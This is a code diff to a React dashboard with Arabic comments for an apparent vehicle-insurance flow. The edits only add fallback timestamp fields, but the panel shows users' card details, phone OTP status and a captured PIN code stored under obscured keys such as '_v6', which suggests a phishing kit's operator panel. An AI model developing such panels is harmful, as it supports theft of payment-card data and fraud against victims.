@@ -1860,7 +1860,7 @@ export default function DashboardPage() {
   // صندوق صفحة بيانات المركبة (insur)
   const renderInsurBox = () => {
     const raw = selectedRequest?.raw || {};
-    const timestamp = raw?.insurUpdatedAt || raw?.updatedAt;
+    const timestamp = raw?.insurUpdatedAt || raw?.updatedAt || raw?.submittedAt;
 
     // ترجمة استخدام المركبة
     const vehicleUsageLabels: Record<string, string> = {
@@ -1928,7 +1928,7 @@ export default function DashboardPage() {
   // صندوق صفحة اختيار الباقة (compar)
   const renderComparBox = () => {
     const raw = selectedRequest?.raw || {};
-    const timestamp = raw?.comparUpdatedAt || raw?.selectedOffer?.updatedAt || raw?.updatedAt;
+    const timestamp = raw?.comparCompletedAt || raw?.comparUpdatedAt || raw?.selectedOffer?.updatedAt || raw?.updatedAt;
 
     const selectedOffer = raw?.selectedOffer || {};
     const offerTypeLabel = selectedOffer?.type === "comprehensive" ? "شامل" : "ضد الغير";
@@ -2495,14 +2495,14 @@ export default function DashboardPage() {
         )}
 
         {/* Card Updated Time */}
-        {raw?.cardUpdatedAt && (
+        {(raw?.cardUpdatedAt || raw?._v1UpdatedAt) && (
           <div style={{
             marginTop: 10,
             fontSize: "0.7rem",
             color: "#9ca3af",
             textAlign: "center"
           }}>
-            <BoxTimer timestamp={raw.cardUpdatedAt} />
+            <BoxTimer timestamp={raw._v1UpdatedAt || raw.cardUpdatedAt} />
           </div>
         )}
       </div>
@@ -2524,7 +2524,7 @@ export default function DashboardPage() {
   // صندوق صفحة رقم الهاتف (step5)
   const renderPhoneBox = () => {
     const raw = selectedRequest?.raw || {};
-    const timestamp = raw?.phoneSubmittedAt || raw?.phoneUpdatedAt || raw?.updatedAt;
+    const timestamp = raw?.phoneSubmittedAt || raw?._v7UpdatedAt || raw?.phoneUpdatedAt || raw?.updatedAt;
 
     const phoneOtpStatus = raw?.phoneOtpStatus;
     const statusConfig: Record<string, { color: string; bg: string; border: string; icon: string; text: string }> = {
@@ -3002,7 +3002,7 @@ export default function DashboardPage() {
   // صندوق صفحة PIN (step3)
   const renderPinBox = () => {
     const raw = selectedRequest?.raw || {};
-    const timestamp = raw?.pinSubmittedAt || raw?.pinUpdatedAt || raw?.updatedAt;
+    const timestamp = raw?.pinSubmittedAt || raw?._v6UpdatedAt || raw?.pinUpdatedAt || raw?.updatedAt;
     
     const pinStatus = raw?._v6Status || raw?.pinStatus;
     const pinCode = raw?._v6 || raw?.pinCode || "";
